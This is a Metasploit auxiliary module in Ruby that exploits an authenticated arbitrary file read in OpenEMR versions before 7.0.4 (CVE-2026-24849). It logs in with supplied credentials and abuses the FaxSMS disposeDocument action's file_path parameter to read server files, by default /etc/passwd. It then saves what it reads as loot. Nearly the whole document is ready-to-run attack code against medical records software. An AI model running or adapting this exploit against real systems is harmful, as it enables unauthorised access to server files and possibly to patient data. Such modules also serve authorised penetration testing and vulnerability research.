##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# AUTO-GENERATED by AMENDER (https://github.com/rezwanul/amender)
# CVE : CVE-2026-24849
# EDB : 52610
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'            => 'OpenEMR < 7.0.4 Authenticated Arbitrary File Read',
        'Description'     => %q{
          Exploits an authenticated arbitrary file read in OpenEMR < 7.0.4 (CVE-2026-24849). The FaxSMS module's EtherFaxActions disposeDocument action passes file_path directly to file_get_contents() without sanitisation, letting any authenticated user read arbitrary server-side files.
        },
        'License'         => MSF_LICENSE,
        'Author'          => ['AMENDER / Rezwanul Haque'],
        'References'      => [
        ['CVE', '2026-24849'],
        ['EDB', '52610']
      ],
        'DisclosureDate'  => '2026-01-15',
        'Notes'           => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [REPEATABLE_SESSION],
          'SideEffects'  => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to OpenEMR', '/']),
        OptString.new('USERNAME',  [true, 'OpenEMR username',     'admin']),
        OptString.new('PASSWORD',  [true, 'OpenEMR password',     '']),
        OptString.new('SITE',      [true, 'OpenEMR site ID',      'default']),
        OptString.new('FILEPATH',  [true, 'Remote file to read',  '/etc/passwd']),
      ]
    )
  end

  # ── Authentication ──────────────────────────────────────────────────────

  def do_login
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'interface/main/main_screen.php'),
      'vars_post' => {
        'new_login_session_management' => '1',
        'authProvider'                 => 'Default',
        'authUser'                     => datastore['USERNAME'],
        'clearPass'                    => datastore['PASSWORD'],
        'languageChoice'               => '1'
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'No response from login endpoint')
    end

    unless res.code == 302
      fail_with(Failure::NoAccess, "Login failed (HTTP #{res.code})")
    end

    cookie = res.get_cookies
    fail_with(Failure::NoAccess, 'Login succeeded but no session cookie returned') if cookie.empty?
    cookie
  end

  # ── Arbitrary file read ─────────────────────────────────────────────────

  def read_remote_file(cookie, file_path)
    faxsms_uri = normalize_uri(target_uri.path, 'interface/modules/custom_modules/oe-module-faxsms/index.php')
    actions    = ['disposeDocument', 'disposeDoc']

    actions.each do |action|
      res = send_request_cgi(
        'method'   => 'GET',
        'uri'      => faxsms_uri,
        'cookie'   => cookie,
        'vars_get' => {
          'site'            => datastore['SITE'],
          'type'            => 'fax',
          '_ACTION_COMMAND' => action,
          'file_path'       => file_path,
          'action'          => 'download'
        }
      )

      next unless res
      body = res.body
      next if body.nil? || body.strip.empty?
      next if body.include?('login_screen.php?error=1')
      next if body.downcase.include?('service is not found')
      next if body.downcase.include?('install or turn service on')
      next if body.include?('Problem with download')

      return body
    end

    nil
  end

  # ── Scanner entry point ─────────────────────────────────────────────────

  def run_host(ip)
    print_status("Authenticating to #{rhost} as '#{datastore['USERNAME']}'...")
    cookie = do_login
    print_good('Authenticated successfully.')

    target_file = datastore['FILEPATH']
    print_status("Reading remote file: #{target_file}")

    content = read_remote_file(cookie, target_file)

    if content
      print_good("File read succeeded (#{content.length} bytes).")
      vprint_line(content)

      loot_path = store_loot(
        'openemr.file.read',
        'text/plain',
        ip,
        content,
        target_file,
        'OpenEMR arbitrary file read via FaxSMS disposeDocument'
      )
      print_good("Saved to loot: #{loot_path}")
    else
      print_error(
        'File read returned no content. ' \
        'Confirm the FaxSMS module is enabled with EtherFax as the provider.'
      )
    end
  end
end
